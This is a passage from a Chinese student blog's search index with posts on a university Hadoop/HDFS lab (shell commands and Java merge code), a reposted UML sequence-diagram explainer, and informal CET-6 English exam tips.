<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>大数据实验之拓荒</title>
      <link href="/2021/09/28/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%9E%E9%AA%8C%E4%B9%8B%E6%8B%93%E8%8D%92/"/>
      <url>/2021/09/28/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%9E%E9%AA%8C%E4%B9%8B%E6%8B%93%E8%8D%92/</url>
      
        <content type="html"><![CDATA[<h1 id="拓荒者"><a href="#拓荒者" class="headerlink" title="拓荒者"></a>拓荒者</h1><p>我们身为HNUST第一批数据科学与大数据技术专业的本科生，非常激动能够使用学院提供的服务器集群，并在这里留下属于我们的痕迹。</p><p><img src="/images/python/image-20210928163906938.png" alt="进入了属于我的master"></p><h1 id="前置准备工作"><a href="#前置准备工作" class="headerlink" title="前置准备工作"></a>前置准备工作</h1><p>CDH<strong>环境说明</strong></p><p>集群目前是以应用用途来划分hdfs用户，因此没有各位同学专属的目录。为此需要各位同学自行设置环境变量指明当前的hdfs用户，建议使用hdfs作为用户。具体做法为在远程终端登录之后(XSHELL 登录成功之后 ) 中执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">export</span> HADOOP_USER_NAME=hdfs<br></code></pre></td></tr></table></figure><p>或者可以将上述命令添加到自己使用的shell环境变量配置文件，以避免每次都需要重新执行上述命令，默认情况下用户配置文件是指是~/.bashrc。</p><p>可以通过 <mark class="hl-label orange">vim</mark>  文本处理命令添加。也可以通过下面的命令直接完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export HADOOP_USER_NAME=hdfs&quot;</span> &gt;&gt; ~/.bashrc<br> <span class="hljs-built_in">source</span> ~./bashrc<br></code></pre></td></tr></table></figure><p>在我们指明了当前的用户之后，分布式文件系统的相对目录会对应在分布式文件系统的/user/hdfs 目录下。</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>为了避免各位同学的数据之间有混淆，建议建立一个自己的文件夹，这里以bigdata9为例。请注意自己运行时以自己的账号为文件夹名称，或其他可以与其它同学区别开的文件夹名称。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hadoop fs -mkdir bigdata9<br></code></pre></td></tr></table></figure><p>之后我们可以使用该目录作为我们使用的目录。<br> 以实验一为例子。</p><h3 id="实验一（SHELL版"><a href="#实验一（SHELL版" class="headerlink" title="实验一（SHELL版 )"></a>实验一（SHELL版 )</h3><p>生成实验所需要的数据文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir input <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;;<br> <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> $i$i<span class="hljs-variable">$i</span> &gt;&gt; input/<span class="hljs-variable">$i</span>.txt;<br> <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mv 3.txt 3.abc<br></code></pre></td></tr></table></figure><p>通过这样我们把实验所需的数据生成在了input目录下。<br> 我们可以看到input目录下的文件为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.txt<br> 2.txt<br> 3.abc<br> 4.txt<br> 5.txt<br></code></pre></td></tr></table></figure><p>把input目录上传到我们先前准备的文件目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hadoop fs -put input bigdata9<br></code></pre></td></tr></table></figure><p>运行如下命令可以查看我们的在 HDFS下的文件 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hadoop fs -ls bigdata9/input<br></code></pre></td></tr></table></figure><p>对于实验一我们可以通过如下一行命令完成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hadoop fs -ls bigdata9/input | awk <span class="hljs-string">&#x27;&#123;print $8&#125;&#x27;</span>| sed -e <span class="hljs-string">&#x27;1d&#x27;</span>|grep -v <span class="hljs-string">&quot;.abc$&quot;</span>|xargs hadoop fs -cat  <br></code></pre></td></tr></table></figure><p>可以看到输出中没有以abc为后缀名的文件内容 (333)，如果需要将输出内容全部保存，则可以通过使用输出重定向完成。也就是在上述命令的末尾添加 &gt;&gt; merge.txt 完成输出的保存。需要注意的是这样文件会被保存在当前本地目录下。</p><h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><p><strong>实验环境：</strong></p><p>（1）IDE：idea</p><p>（2）Hadoop版本：3.1.0</p><p>（3）辅助工具：big data tools</p><p>（本次实验为分布式环境下HDFS编程实例）</p><p><strong>任务描述</strong>：</p><p>假设在HDFS下有几个文件，分别是file1.txt、file2.txt、file3.txt、file4.abc、file5.abc，这里需要从目录中过滤出所有后缀不为.abc的文件，对过滤之后的文件进行读取，并将这些文件的内容合并到文件merge.txt中。</p><p><strong>实验步骤</strong>：</p><p><strong>一、Shell版</strong></p><p><img src="/images/python/clip_image002-16349933910951.jpg" alt="创建好的文件"></p><p><img src="/images/python/clip_image004-16349933910962.jpg" alt="HDFS"></p><p><img src="/images/python/clip_image006-16349933910963.jpg" alt="合并后"></p><p><strong>二、JavaAPI版：</strong></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.van;<br><br><span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;<br><span class="hljs-keyword">import</span> org.apache.hadoop.fs.FileStatus;<br><span class="hljs-keyword">import</span> org.apache.hadoop.fs.FileSystem;<br><span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;<br><span class="hljs-keyword">import</span> org.apache.hadoop.io.IOUtils;<br><span class="hljs-keyword">import</span> org.junit.After;<br><span class="hljs-keyword">import</span> org.junit.Before;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> java.net.URISyntaxException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Author:WangChenXI</span><br><span class="hljs-comment"> *        HuYaNING</span><br><span class="hljs-comment"> *        YinGuanNAN </span><br><span class="hljs-comment"> * Date:2021/10/20 16:55</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hadoop_practice01</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> FileSystem fs;<br>    Path workDir;<br>    Path resultFile;<br>    Configuration conf ;<br>    <span class="hljs-meta">@Before</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> URISyntaxException, IOException, InterruptedException </span>&#123;<br>        URI uri = <span class="hljs-keyword">new</span> URI(<span class="hljs-string">&quot;hdfs://125.221.232.243:8020&quot;</span>);<br>        String user = <span class="hljs-string">&quot;hdfs&quot;</span>;<br>        conf = <span class="hljs-keyword">new</span> Configuration();<br>        fs = FileSystem.get(uri, conf,user);<br>    &#125;<br><br>    <span class="hljs-meta">@After</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        fs.close();<br>    &#125;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testmkdir</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> URISyntaxException, IOException, InterruptedException </span>&#123;<br>        fs.mkdirs(<span class="hljs-keyword">new</span> Path(<span class="hljs-string">&quot;bigdata82/Practice01&quot;</span>));<br>    &#125;<br>    <br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testMerge</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        workDir = <span class="hljs-keyword">new</span> Path(<span class="hljs-string">&quot;bigdata82/Practice01&quot;</span>);<br>        resultFile = <span class="hljs-keyword">new</span> Path(workDir, <span class="hljs-string">&quot;merge.txt&quot;</span>);<br>        Path[] paths = Arrays.stream(fs.listStatus(workDir, path -&gt; !path.toString().matches(<span class="hljs-string">&quot;[\\s\\S]*?\\.abc&quot;</span>)) ).map(FileStatus::getPath).toArray(Path[]::<span class="hljs-keyword">new</span>);<br>        fs.createNewFile(resultFile);<br>        fs.concat(resultFile, paths);<br>        InputStream resultFile= fs.open(<span class="hljs-keyword">this</span>.resultFile);<br>        System.out.println(<span class="hljs-string">&quot;合并后的 merge.txt 内容&quot;</span>);<br>        IOUtils.copyBytes(resultFile, System.out, conf);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>实验效果：</strong></p><p><img src="/images/python/image-20211023205208024.png" alt="web端查看hadoop"></p><p><img src="/images/python/image-20211023205233831.png" alt="合并后的效果"></p><h1 id="实验七"><a href="#实验七" class="headerlink" title="实验七"></a>实验七</h1><p><strong>实验环境：</strong></p><p>（1）IDE：idea</p><p>（2）Hadoop版本：3.1.0</p><p>（3）辅助工具：big data tools</p><p><strong>实验生成测试数据代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author: HuYaNING</span><br><span class="hljs-string">Date: 2021.10.23 18:41</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>txtName = <span class="hljs-string">&quot;Generate_data04.txt&quot;</span><br>txtLine = <span class="hljs-number">188</span><br>pid = [<span class="hljs-string">&quot;01&quot;</span>,<span class="hljs-string">&quot;02&quot;</span>,<span class="hljs-string">&quot;03&quot;</span>,<span class="hljs-string">&quot;04&quot;</span>,<span class="hljs-string">&quot;05&quot;</span>,<span class="hljs-string">&quot;06&quot;</span>,<span class="hljs-string">&quot;07&quot;</span>,<span class="hljs-string">&quot;08&quot;</span>,<span class="hljs-string">&quot;09&quot;</span>,<span class="hljs-string">&quot;10&quot;</span>]<br>i = <span class="hljs-number">1</span>;<br>f = <span class="hljs-built_in">open</span>(txtName,<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">while</span>(i&lt;=txtLine):<br>    f.write(<span class="hljs-built_in">str</span>(<span class="hljs-number">1000</span>+i)+<span class="hljs-string">&quot;  &quot;</span>+pid[random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)]+<span class="hljs-string">&quot;  &quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;\n&quot;</span>)<br>    i = i+<span class="hljs-number">1</span><br>f.close()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程设计 </tag>
            
            <tag> hadoop </tag>
            
            <tag> 大数据技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程之时序图</title>
      <link href="/2021/09/22/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E6%97%B6%E5%BA%8F%E5%9B%BE/"/>
      <url>/2021/09/22/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E6%97%B6%E5%BA%8F%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是时序图"><a href="#什么是时序图" class="headerlink" title="什么是时序图#"></a>什么是时序图<a href="https://www.cnblogs.com/54chensongxia/p/13236965.html#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%B6%E5%BA%8F%E5%9B%BE">#</a></h2><p>时序图(Sequence Diagram)，又名序列图、循序图，是一种UML交互图。它通过描述对象之间发送消息的时间顺序显示多个对象之间的动态协作。</p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景#"></a>使用场景<a href="https://www.cnblogs.com/54chensongxia/p/13236965.html#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF">#</a></h2><p>时序图的使用场景非常广泛，几乎各行各业都可以使用。当然，作为一个软件工作者，我这边主要列举和软件开发有关的场景。</p><p><strong>1. 梳理业务流程</strong></p><p>一般的软件开发都是为了支撑某个具体的业务。有时候业务的流程会比较复杂，涉及到多种角色，这时就可以使用时序图来梳理这个业务逻辑。这样会使业务看起来非常清晰，代码写起来也是水到渠成的事情了。</p><p><a href="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200710151555933-518672375.jpg"><img src="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200710151555933-518672375.jpg" alt="img"></a></p><p><strong>2. 梳理开源软件</strong></p><p>作为一个合格的程序员，阅读源代码的能力一定要过关。一般成熟框架的源代码调用深度都比较深，类之间的调用关系也比较复杂。我喜欢用时序图来梳理框架中这些对象之间的关系。比如再看Tomcat启动流程的过程中，我就时序图梳理了各个组件之间的关系，看起来层次非常清楚，也便于记忆。</p><p><a href="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200704220716365-1370663428.png"><img src="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200704220716365-1370663428.png" alt="img"></a></p><h2 id="时序图的角色"><a href="#时序图的角色" class="headerlink" title="时序图的角色#"></a>时序图的角色<a href="https://www.cnblogs.com/54chensongxia/p/13236965.html#%E6%97%B6%E5%BA%8F%E5%9B%BE%E7%9A%84%E8%A7%92%E8%89%B2">#</a></h2><p>我们在画时序图时会涉及下面7种元素：</p><ul><li>角色(Actor)</li><li>对象(Object)</li><li>生命线(LifeLine)</li><li>控制焦点(Activation)</li><li>消息(Message)</li><li>自关联消息</li><li>组合片段。</li></ul><p>其中前6种是比较常用和重要的元素，最后的组合片段元素不是很常用，但是比较复杂。我们先介绍前6种元素，再单独介绍组合片段元素。</p><p><strong>1. 角色(Actor)</strong></p><p>系统角色，可以是人或者其他系统和子系统。以一个小人图标表示。</p><p><strong>2. 对象(Object)</strong></p><p>对象位于时序图的顶部,以一个矩形表示。对象的命名方式一般有三种：</p><ul><li>对象名和类名。例如：华为手机:手机、loginServiceObject:LoginService；</li><li>只显示类名，不显示对象，即为一个匿名类。例如：:手机、:LoginSservice。</li><li>只显示对象名，不显示类名。例如：华为手机:、loginServiceObject:。</li></ul><p><strong>3. 生命线(LifeLine)</strong></p><p>时序图中每个对象和底部中心都有一条垂直的虚线，这就是对象的生命线(对象的时间线)。以一条垂直的虚线表。</p><p><strong>4. 控制焦点(Activation)</strong></p><p>控制焦点代表时序图中在对象时间线上某段时期执行的操作。以一个很窄的矩形表示。</p><p><strong>5. 消息(Message)</strong></p><p>表示对象之间发送的信息。消息分为三种类型。</p><ul><li><p>同步消息(Synchronous Message)<br>消息的发送者把控制传递给消息的接收者，然后停止活动，等待消息的接收者放弃或者返回控制。用来表示同步的意义。以<strong>一条实线和实心箭头表示</strong>。</p></li><li><p>异步消息(Asynchronous Message)</p><p>消息发送者通过消息把信号传递给消息的接收者，然后继续自己的活动，不等待接受者返回消息或者控制。异步消息的接收者和发送者是并发工作的。以<strong>一条实线和大于号表示</strong>。</p></li><li><p>返回消息(Return Message)<br>返回消息表示从过程调用返回。以<strong>小于号和虚线表示</strong>。</p></li></ul><p><strong>6. 自关联消息</strong></p><p>表示方法的自身调用或者一个对象内的一个方法调用另外一个方法。以一个半闭合的长方形+下方实心剪头表示。</p><p>下面举例一个时序图的列子，看下上面几种元素具体的使用方式。</p><p><a href="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200712162814914-638213115.png"><img src="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200712162814914-638213115.png" alt="img"></a></p><p><strong>7. 组合片段</strong></p><p>组合片段用来解决交互执行的条件和方式，它允许在序列图中直接表示逻辑组件，用于通过指定条件或子进程的应用区域，为任何生命线的任何部分定义特殊条件和子进程。组合片段共有13种，名称及含义如下：</p><table><thead><tr><th>组合名称</th><th>组合含义</th></tr></thead><tbody><tr><td>ref</td><td>引用其他地方定义的组合片段</td></tr><tr><td>alt</td><td>在一组行为中根据特定的条件选择某个交互</td></tr><tr><td>opt</td><td>表示一个可选的行为</td></tr><tr><td>break</td><td>提供了和编程语言中的break类拟的机制</td></tr><tr><td>par</td><td>支持交互片段的并发执行</td></tr><tr><td>seq</td><td>强迫交互按照特定的顺序执行</td></tr><tr><td>strict</td><td>明确定义了一组交互片段的执行顺序</td></tr><tr><td>neg</td><td>用来标志不应该发生的交互</td></tr><tr><td>region</td><td>标志在组合片段中先于其他交互片断发生的交互</td></tr><tr><td>ignore</td><td>明确定义了交互片段不应该响应的消息</td></tr><tr><td>consider</td><td>明确标志了应该被处理的消息</td></tr><tr><td>assert</td><td>标志了在交互片段中作为事件唯一的合法继续者的操作数</td></tr><tr><td>loop</td><td>说明交互片段会被重复执行</td></tr></tbody></table><p>组合片段的功能平时用的不是很多，具体使用时可以参考本文最后关于组合片段的文章，这边不做深入介绍了。</p><h2 id="画图工具推荐"><a href="#画图工具推荐" class="headerlink" title="画图工具推荐#"></a>画图工具推荐<a href="https://www.cnblogs.com/54chensongxia/p/13236965.html#%E7%94%BB%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90">#</a></h2><p><strong><a href="https://processon.com/">processon</a></strong></p><ul><li>ProcessOn是一个在线作图工具的聚合平台，它可以在线画流程图、思维导图、UI原型图、UML、网络拓扑图、组织结构图等等，您无需担心下载和更新的问题，不管Mac还是Windows，一个浏览器就可以随时随地的发挥创意，规划工作；</li><li>您可以把作品分享给团队成员或好友，无论何时何地大家都可以对作品进行编辑、阅读和评论；</li><li>ProcessOn不仅仅汇聚着强大的作图工具，这里还有着海量的图形化知识资源我们尽可能的将有价值的知识进行梳理，传递到您的眼前。</li></ul><p><a href="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200712163810994-2033400356.png"><img src="https://img2020.cnblogs.com/blog/1775037/202007/1775037-20200712163810994-2033400356.png" alt="img"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考#"></a>参考<a href="https://www.cnblogs.com/54chensongxia/p/13236965.html#%E5%8F%82%E8%80%83">#</a></h2><ul><li><a href="https://blog.csdn.net/fly_zxy/article/details/80911942%EF%BC%88%E9%87%8D%E7%82%B9%E5%8F%82%EF%BC%89">https://blog.csdn.net/fly_zxy/article/details/80911942（重点参）</a></li><li><a href="http://baijiahao.baidu.com/s?id=1561926824533534&amp;wfr=spider&amp;for=pc">http://baijiahao.baidu.com/s?id=1561926824533534&amp;wfr=spider&amp;for=pc</a></li><li><a href="https://www.cnblogs.com/whylaughing/p/5794693.html">组合片段</a></li></ul><blockquote><p>作者：程序员自由之路</p><p>出处：<a href="https://www.cnblogs.com/54chensongxia/p/13236965.html">https://www.cnblogs.com/54chensongxia/p/13236965.html</a></p><p>版权：本作品采用「<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a>」许可协议进行许可。</p></blockquote><h2 id="自己画的几个时序图"><a href="#自己画的几个时序图" class="headerlink" title="自己画的几个时序图"></a>自己画的几个时序图</h2><p>![登陆时序图](/images/python/1905060202 胡雅宁 软件工程作业(登录时序图).png)</p><p>![查询图书时序图](/images/python/1905060202 胡雅宁 软件工程作业(查询图书时序图) .png)</p><p>![添加图书时序图](/images/python/1905060202 胡雅宁 软件工程作业(添加图书时序图).png)</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程设计 </tag>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>速过英语六级攻略</title>
      <link href="/2021/09/09/%E9%80%9F%E8%BF%87%E8%8B%B1%E8%AF%AD%E5%85%AD%E7%BA%A7%E6%94%BB%E7%95%A5/"/>
      <url>/2021/09/09/%E9%80%9F%E8%BF%87%E8%8B%B1%E8%AF%AD%E5%85%AD%E7%BA%A7%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="英语六级的判分机制"><a href="#英语六级的判分机制" class="headerlink" title="英语六级的判分机制"></a>英语六级的判分机制</h1><p>第一，你要知道，成绩计算其实是有公式的，<strong>官方给出的公式是：</strong></p><p><img src="https://pic1.zhimg.com/50/v2-db11617932b561263ac8e5084085d2fa_720w.jpg?source=1940ef5c" alt="img"></p><p>解释一下：</p><ol><li><p><strong>X：</strong>代表的是你该项卷面分</p></li><li><p><strong>Mean：</strong>代表的是样本均值</p></li><li><p><strong>SD：</strong>代表的是样本标准差</p></li><li><p><strong>TotSco：</strong>就是最后打在成绩单上的分数啦。</p></li></ol><p>其中Mean和SD由<strong>本次考试被抽样的学生成绩所决定</strong>，所以啊，成绩高低还得看他们的发挥啊！</p><p>四级考试的常模群体选自<strong>全国16所高校的约三万名非英语专业的考生</strong>；六级常模群体选自<strong>全国五所重点大学的约五千名非英语专业的考生</strong>。</p><p><strong>四六级的分数不是由你答对的题目决定的，而是由你在抽样学生中的排名所决定的。</strong></p><p>对我们来说，这就是一场排位赛！你的分数取决于你在这个排位中的位置。</p><p>想要排位高，拿分高，就要确保自己能拿的分一定拿下，让自己的X远超过Mean。</p><h1 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h1><p>知道了六级判分的规则，我们如何应对呢？如我们只是简单的、很傻逼把整张卷子从头做到尾，按照出卷人的顺序做题，那你就中圈套了！！</p><p>下面我们看一张六级试卷题型与分数的分布图。</p><p><img src="https://pic4.zhimg.com/80/v2-e0059d3c6d6fc74b8f6547aeaa1f35a7_720w.jpg" alt="img"></p><p>可以看出来，分值占比较大的题型是<mark class="hl-label red">听力篇章</mark> ，<mark class="hl-label red">仔细阅读</mark> ，<mark class="hl-label red">写作</mark> ，<mark class="hl-label red">段落翻译</mark> ，<mark class="hl-label red">长篇阅读</mark> 。这些加在一起，分数占比达到了恐怖的**80%**。</p><p>请问你看出什么端倪来了吗？</p><p>倘若你能把这80%都拿下，哪怕说拿下其中的40%，你就已经超过了绝大多数同学了。为什么？因为六级分数分布符合正态分布！</p><p>术业有专攻啊，同学们！何必苦苦追求那可怜的短篇新闻、长对话和词汇理解的分数呢？对我来说，词汇理解就是六级题型中最恶心的部分，你词汇量不够大，语法体系不够完善，理解出现了误差，给你一天时间都做不完！自己只会陷入对不熟的词汇的无尽的纠结之中，十分痛苦。</p><h1 id="得阅读者得天下"><a href="#得阅读者得天下" class="headerlink" title="得阅读者得天下"></a>得阅读者得天下</h1><p>阅读考察的是词汇量和语感，这需要大量的时间去练习。我们可以看到仔细阅读加上长阅读得分数占比就已经高达30%了！别看不起30%，但凡听力难一点，大家都不会，你要把这30%拿下，绝逼就可以通过六级考试。</p><p>得阅读者的天下！请记住这句话！</p><p>如果你想通过六级考试，记得把这30%全拿下，最差也得拿下25%。这就意味着，你的仔细阅读+长阅读最多只能错三个。</p><p>如何保证阅读理解得高分呢？三个字，<strong>词汇量</strong>。<strong>你对英语的一切的恐惧都源自词汇量的不足。</strong></p><p>怎么提高词汇量？日复一日的重复和坚持！请问你有一直在背单词吗？如果没有，对不起，你与六级无缘。</p><p>背单词是很苦逼的事情，但请坚持下去，哪怕每天只看20个单词，坚持它180天，六级核心词汇也就全拿下了。什么？你觉得180天很长吗？它只不过是你大学一个学期加假期的长度，只不过是一年之内两次六级考试之间的时间间隔。弹指一挥间。</p><h2 id="仔细阅读攻略"><a href="#仔细阅读攻略" class="headerlink" title="仔细阅读攻略"></a>仔细阅读攻略</h2><p>如果你够牛逼，请真正做到仔细阅读，把他每一句话都读懂。但我们没那么牛逼，所以要取巧。仔细阅读，不必那么仔细。读不懂的地方先跳过，你要用短时间把全文看一遍，大致上了解这篇文章的意思。然后直接他妈的看问题，拿着问题再去对着文章读一遍！我这么做，仔细阅读最低正确率达到了80%。巅峰是90%。</p><h2 id="长阅读攻略"><a href="#长阅读攻略" class="headerlink" title="长阅读攻略"></a>长阅读攻略</h2><p>长阅读，顾名思义，文章很长。如果你想把整篇都读透读懂，你不是大神，就是傻逼。你要做的是快速阅读每一段，用极其精炼的语言标注这一段讲的大体意思，然后再读下一段，循环往复。当你第一遍浏览完了，标注完了，直接带着问题再快速扫一遍文章，找到意思相近的段落，八九不离十就是它了，请相信你的直觉。</p><h1 id="听力也能撑起半壁江山"><a href="#听力也能撑起半壁江山" class="headerlink" title="听力也能撑起半壁江山"></a>听力也能撑起半壁江山</h1><p>我是黑龙江考生，2019年参加高考。当年我们英语考试并不考听力，所以我的听力基础为0.即便如此，我依然可以保证自己的听力正确率达到30%-40%。这已经很好了。怎么做？我们是大数据专业，请使用你的专业技能，对六级听力答案分布做一次数据分析，相信你会有自己的收获。我只能说，它是有规律的，最明显的规律，就是5a，5b，5c，5d起步。剩下的两项答案，随缘分配。</p><h1 id="写作和翻译"><a href="#写作和翻译" class="headerlink" title="写作和翻译"></a>写作和翻译</h1><p>这俩我放在一块讲，因为他们是相辅相成的。写作和翻译是我的弱项，所以我没办法提供太好的建议，不够资格。我一般都是现场胡编乱造，用点高逼格的单词，写点曾经背过的超级屌的短句。</p><h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><ul><li>听力部分尽量跟着听，用自己确定的选项，使用答案分布规律，换掉其他不确定的选项。</li><li>阅读理解部分，必须拿下长阅读和仔细阅读，把选词填空放弃腾出时间去做仔细阅读和长阅读也可以，但是你不能空着，要快速懵满。</li><li>写作和翻译部分，尽量用高级词汇替代低级词汇，用点高逼格的短语。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小妙招 </tag>
            
            <tag> 考研 </tag>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法之简单模拟题（一）</title>
      <link href="/2021/08/17/%E7%AE%97%E6%B3%95%E4%B9%8B%E7%AE%80%E5%8D%95%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/08/17/%E7%AE%97%E6%B3%95%E4%B9%8B%E7%AE%80%E5%8D%95%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
